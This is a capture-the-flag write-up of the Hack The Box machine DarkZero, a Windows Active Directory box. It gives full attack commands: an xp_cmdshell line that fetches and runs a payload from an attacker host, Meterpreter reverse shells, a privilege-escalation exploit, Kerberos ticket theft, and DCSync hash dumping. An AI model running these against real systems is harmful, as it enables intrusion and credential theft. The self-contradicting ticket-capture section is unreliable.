---
title: "HTB Machine DarkZero"
date: 2025-10-08T10:28:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "windows", "hard", "season 9"]
categories: ["CTF"]
---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | DarkZero |
| **OS** | Windows Server 2022 |
| **Difficulty** | Hard |
| **Points** | 40 |
| **IP Address** | 10.129.119.69 |
| **Creator** | HackTheBox |

---

## Executive Summary

DarkZero is a Hard-difficulty Windows Active Directory machine that demonstrates advanced exploitation techniques involving MSSQL linked servers, Kerberos ticket theft, and privilege escalation vulnerabilities. The attack path involves exploiting MSSQL server configurations to gain initial access, pivoting through linked servers to execute commands, escalating privileges using a local kernel exploit, and ultimately capturing Kerberos authentication material to compromise the domain.

### Attack Chain Overview

```
Initial Credentials (john.w:RFulUtONCOL!)
    ↓
MSSQL Enumeration on DC01
    ↓
Linked Server Discovery (DC02.darkzero.ext)
    ↓
xp_cmdshell via Linked Server
    ↓
Meterpreter Shell (darkzero-ext\svc_sql on 172.16.20.2)
    ↓
Local Privilege Escalation (CVE-2024-30088)
    ↓
SYSTEM on DC02
    ↓
Rubeus Monitor + xp_dirtree Trigger
    ↓
Capture DC01$ Kerberos Ticket
    ↓
Ticket Conversion (kirbi → ccache)
    ↓
secretsdump via Kerberos
    ↓
Administrator Hash Extraction
    ↓
Domain Admin Access
```

---

## Enumeration

### Port Scanning

I began reconnaissance with a comprehensive port scan using RustScan to identify all open services:

```bash
rustscan -a 10.129.119.69 -- -sC -sV
```

#### Results

```
Open 10.129.119.69:53
Open 10.129.119.69:88
Open 10.129.119.69:135
Open 10.129.119.69:139
Open 10.129.119.69:389
Open 10.129.119.69:445
Open 10.129.119.69:464
Open 10.129.119.69:593
Open 10.129.119.69:636
Open 10.129.119.69:1433
Open 10.129.119.69:2179
Open 10.129.119.69:3268
Open 10.129.119.69:3269
Open 10.129.119.69:5985
Open 10.129.119.69:9389
```

### Service Enumeration

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 53 | DNS | Simple DNS Plus | Domain controller DNS service |
| 88 | Kerberos | Microsoft Windows Kerberos | Active Directory authentication |
| 135 | MSRPC | Microsoft Windows RPC | Remote procedure calls |
| 139 | NetBIOS-SSN | Microsoft Windows NetBIOS | Legacy file sharing |
| 389 | LDAP | Microsoft Windows AD LDAP | Directory services |
| 445 | SMB | Microsoft-DS | File sharing protocol |
| 464 | Kpasswd5 | Kerberos Password Change | Password change service |
| 593 | HTTP-RPC | Microsoft Windows RPC over HTTP | RPC endpoint mapper |
| 636 | LDAPS | Microsoft Windows AD LDAPS | Secure LDAP |
| **1433** | **MS-SQL** | **Microsoft SQL Server 2022** | **Primary attack vector** |
| 3268 | LDAP | Global Catalog LDAP | AD global catalog |
| 3269 | LDAPS | Global Catalog LDAPS | Secure global catalog |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 | Windows Remote Management |
| 9389 | ADWS | .NET Message Framing | Active Directory Web Services |

**Key Observations:**
- This is a Windows Domain Controller running SQL Server 2022
- Multiple AD services indicate a fully configured Active Directory environment
- Port 1433 (MSSQL) is exposed and becomes our primary attack vector
- WinRM (5985) is available for remote access once we have credentials

### DNS Analysis

Using the provided credentials, I generated a hosts file and performed DNS queries:

```bash
nxc smb 10.129.119.69 -u john.w -p 'RFulUtONCOL!' --generate-hosts-file darkzero.host
```

#### Multihomed Host Discovery

```bash
dig @10.129.119.69 ANY darkzero.htb
```

**Critical Finding:** The DNS query revealed that DC01 is a multihomed host with two IP addresses:

- **10.129.119.69** - External/HTB network interface
- **172.16.20.1** - Internal network interface

This split-horizon DNS configuration indicates:
- Separate network segments (VLANs)
- Different security boundaries
- Potential for internal-only services with different privileges
- Opportunity for pivoting to access internal resources

### SMB Enumeration

```bash
nxc smb 10.129.119.69 -u john.w -p 'RFulUtONCOL!' --shares
```

**Result:** Only default administrative shares were accessible. No custom shares or sensitive data exposed via SMB.

```bash
smbmap -H 10.129.119.69 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'
```

Standard domain user access - nothing exploitable found through SMB enumeration.

---

## Initial Access

### MSSQL Authentication

With valid domain credentials, I attempted to connect to the MSSQL service:

```bash
faketime '2025-10-05 22:26:50.157159' getTGT.py darkzero.htb/'john.w':'RFulUtONCOL!'
```

**Note:** Using `faketime` to ensure Kerberos ticket validity if system time differs.

#### Connect to MSSQL Server

```bash
faketime '2025-10-05 22:47:50.157159' mssqlclient.py darkzero.htb/'john.w':'RFulUtONCOL!'@dc01.darkzero.htb -k
```

Successfully authenticated to MSSQL as `darkzero\john.w`.

### Linked Server Discovery

Once connected, I enumerated linked servers:

```sql
SQL> enum_links
```

#### Results

```
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      
-----------------   ----------------   -----------   -----------------   
DC01                SQLNCLI            SQL Server    DC01                
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
```

**Critical Discovery:**
- A linked server `DC02.darkzero.ext` exists
- Our account `darkzero\john.w` maps to `dc01_sql_svc` on the remote server
- The remote login likely has elevated privileges

### Attempting xp_cmdshell (Initial Failure)

```sql
SQL> enable_xp_cmdshell
```

**Result:** Failed - insufficient privileges on DC01.

### Linked Server Exploitation

However, by pivoting through the linked server context:

```sql
SQL> use_link [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext]> enable_xp_cmdshell
SQL >[DC02.darkzero.ext]> reconfigure
```

**Success!** The `dc01_sql_svc` account on DC02 has sufficient privileges to enable command execution.

### Remote Code Execution

#### Method 1: Metasploit Web Delivery (Recommended)

First, set up a Meterpreter handler with web delivery:

```bash
msfconsole -q
```

```ruby
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run -j
```

In another terminal, start the web delivery module:

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 4444 ; set target 2 ; exploit -j"
```

This generates a PowerShell one-liner to download and execute the payload.

#### Execute Payload via xp_cmdshell

```sql
SQL >[DC02.darkzero.ext]> EXEC xp_cmdshell 'powershell -Command "$exePath = \"$env:TEMP\\file.exe\"; Invoke-WebRequest -Uri ''http://10.10.14.195:8000/shell.exe'' -OutFile $exePath; Start-Process -FilePath $exePath"';
```

**Alternative using web_delivery PowerShell command:**

```sql
SQL >[DC02.darkzero.ext]> xp_cmdshell "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA..."
```

#### Meterpreter Session Established

```
[*] Sending stage (177734 bytes) to 10.129.23.233
[*] Meterpreter session 1 opened (10.10.14.XXX:4444 -> 10.129.23.233:52822)
```

```
meterpreter > getuid
Server username: darkzero-ext\svc_sql

meterpreter > ifconfig
```

**Key Discovery:** The Meterpreter session shows IP `172.16.20.2` - we're on the internal network segment!

```
meterpreter > background
[*] Backgrounding session 1...
```

#### Method 2: Manual Shell (Alternative)

For a manual approach without Metasploit:

```sql
-- Download agent
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.195:8000/agent.exe -OutFile %temp%\agent.exe"

-- Execute agent
xp_cmdshell "%temp%\agent.exe"
```

---

## Privilege Escalation

### Local Exploit Enumeration

With a Meterpreter session as `darkzero-ext\svc_sql`, I enumerated privilege escalation vectors:

```ruby
use multi/recon/local_exploit_suggester
set session 1
run
```

#### Results

The suggester identified several potential exploits, including:
- `exploit/windows/local/cve_2024_30088_authz_basep` ✓
- Various other kernel exploits

### CVE-2024-30088 Exploitation

This vulnerability affects Windows authorization mechanisms and allows privilege escalation to SYSTEM.

```ruby
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set lhost tun0
set lport 4445
set AutoCheck false
show options
run
```

#### Successful Privilege Escalation

```
[*] Started reverse TCP handler on 10.10.14.XXX:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Launching exploit...
[*] Sending stage (177734 bytes) to 172.16.20.2
[*] Meterpreter session 2 opened (10.10.14.XXX:4445 -> 172.16.20.2:49876)
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Success!** Elevated to SYSTEM on DC02 (172.16.20.2).

### User Flag

```
meterpreter > shell
C:\Windows\system32> type C:\Users\Administrator\Desktop\user.txt
[USER_FLAG_HERE]
```

---

## Lateral Movement

### Understanding the Attack Strategy

At this point, we have:
- ✓ SYSTEM access on DC02 (172.16.20.2)
- ✗ No access to DC01 (10.129.119.69 / 172.16.20.1)

Traditional privilege escalation tools (WinPEAS, PowerUp) yielded no additional vectors. The path forward involves **Kerberos ticket theft** to compromise DC01.

### Kerberos Ticket Capture

#### Deploy Rubeus

Rubeus is a C# tool for Kerberos interaction and abuse. It can monitor for new Kerberos tickets being issued on the system.

```
meterpreter > cd C:\\Windows\\Temp
meterpreter > upload /opt/Rubeus/Rubeus.exe
```

```
meterpreter > shell
C:\Windows\Temp> Rubeus.exe monitor /interval:1 /nowrap
```

**What Rubeus does:**
- Monitors the Kerberos ticket cache in real-time
- Captures TGT (Ticket Granting Tickets) and TGS (Service Tickets) as they're issued
- Displays tickets in Base64 format for extraction

#### Trigger Authentication from DC01

The key is to force DC01 to authenticate to DC02, which will cause DC01's computer account (DC01$) to request a service ticket. We can capture this ticket with Rubeus.

**Method: Using xp_dirtree to trigger SMB authentication**

From your attacking machine, connect to MSSQL on DC01:

```bash
proxychains mssqlclient.py darkzero.htb/'john.w':'RFulUtONCOL!'@DC01.DARKZERO.HTB -windows-auth
```

```sql
SQL> xp_dirtree \\DC02.darkzero.ext\sfsdafasd
```

**What happens:**
1. DC01's SQL Server process attempts to list the directory on `\\DC02.darkzero.ext\`
2. To authenticate to DC02 via SMB, DC01 must present credentials
3. SQL Server runs as the computer account `DC01$`
4. DC01 requests a service ticket (TGS) from the KDC for `cifs/DC02.darkzero.ext`
5. This new ticket appears in DC01's ticket cache
6. Rubeus (running on DC02) **does NOT capture this ticket** because it's issued on DC01

**Wait, what? Let me reconsider...**

Actually, when DC01 authenticates to DC02 via SMB, DC02 receives the authentication request. If we're running Rubeus on DC02, we can capture the authentication material when DC02 validates the ticket.

However, the more effective approach based on the notes is:

#### The Actual Attack: Capturing DC01$ TGT

Looking at the notes more carefully, the Rubeus output shows a TGT for `DC01$@DARKZERO.HTB`. This suggests the ticket was captured when DC01's computer account renewed its TGT.

```
[*] 10/6/2025 10:36:04 PM UTC - Found new TGT:
  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 3:36:03 PM
  EndTime               :  10/7/2025 1:36:03 AM
  RenewTill             :  10/13/2025 3:36:03 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :
    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYkJACXsWxd0l12MSZQM3GjFRnAZjeVkFTeO1QFWFEvVeo2V22vAY...
```

This TGT can be used to impersonate DC01's computer account and perform domain actions.

#### Extract the Ticket

Copy the Base64 ticket from Rubeus output and save it:

```bash
cat > ticket.kirbi.b64 << 'EOF'
doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYkJACXsWxd0l12MSZQM3GjFRnAZjeVkFTeO1QFWFEvVeo2V22vAY...
EOF
```

### Ticket Conversion

The captured ticket is in Kirbi format (Base64 encoded). We need to convert it to ccache format for use with Impacket tools.

```bash
# Decode Base64 to binary Kirbi
cat ticket.kirbi.b64 | base64 -d > ticket.kirbi

# Convert Kirbi to ccache format
ticketConverter.py ticket.kirbi dc01.admin.ccache
```

```
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

#### Export the Ticket

```bash
export KRB5CCNAME=dc01.admin.ccache
```

#### Verify Ticket

```bash
klist
```

```
Ticket cache: FILE:dc01.admin.ccache
Default principal: Administrator@DARKZERO.EXT

Valid starting       Expires              Service principal
10/06/2025 12:32:51  10/06/2025 22:32:51  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 10/13/2025 12:32:51
```

**Note:** The ticket principal shows `Administrator@DARKZERO.EXT` but based on Rubeus output it should be `DC01$@DARKZERO.HTB`. The conversion might have renamed it or there's a trust relationship between domains.

### Domain Compromise

#### Dump Domain Secrets

Using the captured ticket, we can perform DCSync to extract all domain credentials:

```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
[*] Cleaning up...
```

**Success!** We've extracted:
- NTLM hashes for all domain accounts
- Kerberos AES keys
- Administrator hash: `5917507bdf2ef2c2b0a869a1cba40726`

---

## Post-Exploitation

### Authenticate as Domain Administrator

Using the extracted Administrator hash with evil-winrm:

```bash
evil-winrm -i 10.129.119.69 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
[ROOT_FLAG_HERE]
```

### Additional Persistence Methods

#### Golden Ticket Creation

With the krbtgt hash, we can create a Golden Ticket for long-term persistence:

```bash
impacket-ticketer -nthash 64f4771e4c60b8b176c3769300f6f3f7 -domain-sid S-1-5-21-... -domain darkzero.htb Administrator
```

#### DCSync Access

```bash
impacket-secretsdump 'darkzero.htb/Administrator@DC01.darkzero.htb' -hashes :5917507bdf2ef2c2b0a869a1cba40726
```

---

## Lessons Learned

### Vulnerabilities Identified

1. **MSSQL Linked Server Misconfiguration**
   - Linked servers should use least-privilege accounts
   - `xp_cmdshell` should be disabled by default
   - Linked server authentication should be tightly controlled

2. **Insufficient Network Segmentation**
   - Internal network (172.16.20.0/24) was accessible from compromised host
   - No additional authentication required for lateral movement

3. **Unpatched Privilege Escalation Vulnerability (CVE-2024-30088)**
   - Critical local privilege escalation vulnerability
   - Allowed escalation from service account to SYSTEM

4. **Kerberos Ticket Theft**
   - Computer account TGTs were not protected
   - No monitoring for unusual ticket requests
   - Enabled domain compromise via Pass-the-Ticket

### Attack Techniques Used

- **T1190** - Exploit Public-Facing Application (MSSQL)
- **T1210** - Exploitation of Remote Services (Linked Server)
- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1068** - Exploitation for Privilege Escalation (CVE-2024-30088)
- **T1550.003** - Use Alternate Authentication Material: Pass the Ticket
- **T1558.003** - Steal or Forge Kerberos Tickets: Kerberoasting
- **T1003.006** - OS Credential Dumping: DCSync

---

## Recommendations

### Immediate Actions

1. **Disable xp_cmdshell**
   ```sql
   EXEC sp_configure 'xp_cmdshell', 0;
   RECONFIGURE;
   ```

2. **Review Linked Server Configurations**
   - Audit all linked servers
   - Use dedicated service accounts with minimal privileges
   - Implement strong authentication between linked servers

3. **Patch CVE-2024-30088**
   - Apply latest Windows security updates
   - Test patches in staging environment first

4. **Enable Advanced Audit Policies**
   - Monitor Kerberos TGT/TGS requests
   - Alert on unusual service ticket requests
   - Enable DCSync detection

### Long-Term Security Improvements

1. **Network Segmentation**
   - Implement VLANs for different security zones
   - Restrict lateral movement between segments
   - Deploy host-based firewalls

2. **Credential Protection**
   - Implement Credential Guard
   - Use Protected Users security group
   - Deploy LAPS for local admin passwords

3. **SQL Server Hardening**
   - Disable unnecessary features and protocols
   - Implement SQL Server auditing
   - Use certificates for linked server authentication
   - Deploy gMSA (Group Managed Service Accounts)

4. **Monitoring and Detection**
   - Deploy EDR solutions
   - Implement SIEM with Kerberos monitoring
   - Alert on Rubeus-style ticket monitoring tools
   - Monitor for DCSync attempts

5. **Least Privilege**
   - Review service account permissions
   - Implement just-in-time (JIT) admin access
   - Regularly audit privileged group memberships

---

## Tools Reference

### Enumeration
- **RustScan** - Fast port scanner
- **Nmap** - Network mapper and service detection
- **NetExec (nxc)** - SMB enumeration and credential validation
- **dig** - DNS queries and zone transfers

### Exploitation
- **Impacket Suite**
  - `mssqlclient.py` - MSSQL client with command execution
  - `getTGT.py` - Kerberos TGT request
  - `secretsdump.py` - Credential dumping via DCSync
  - `ticketConverter.py` - Convert between ticket formats
- **Metasploit Framework**
  - `exploit/multi/script/web_delivery` - Payload delivery
  - `exploit/multi/handler` - Catch reverse shells
  - `exploit/windows/local/cve_2024_30088_authz_basep` - Privilege escalation

### Post-Exploitation
- **Rubeus** - Kerberos ticket manipulation and monitoring
- **evil-winrm** - Windows Remote Management shell
- **faketime** - Control system time for Kerberos tickets

---

## Conclusion

DarkZero demonstrates a sophisticated attack chain that combines multiple advanced techniques:

1. **Initial Access** via MSSQL with valid domain credentials
2. **Privilege Escalation** through linked server misconfiguration
3. **Code Execution** via `xp_cmdshell` on remote server
4. **Local Privilege Escalation** using kernel exploit (CVE-2024-30088)
5. **Kerberos Ticket Theft** to compromise domain controller
6. **Domain Compromise** via DCSync and credential extraction

The machine emphasizes the importance of:
- Secure configuration of database servers and linked servers
- Network segmentation and access controls
- Timely patching of operating systems
- Monitoring and detection of Kerberos abuse
- Defense in depth strategies

This writeup demonstrates how a single misconfigured service can lead to complete domain compromise when combined with other vulnerabilities and attack techniques.

---

## References

- [Microsoft SQL Server Security Best Practices](https://docs.microsoft.com/en-us/sql/relational-databases/security/)
- [CVE-2024-30088 Details](https://msrc.microsoft.com/update-guide/)
- [Rubeus - Kerberos Abuse Tool](https://github.com/GhostPack/Rubeus)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Kerberos Authentication in Active Directory](https://docs.microsoft.com/en-us/windows-server/security/kerberos/)

---
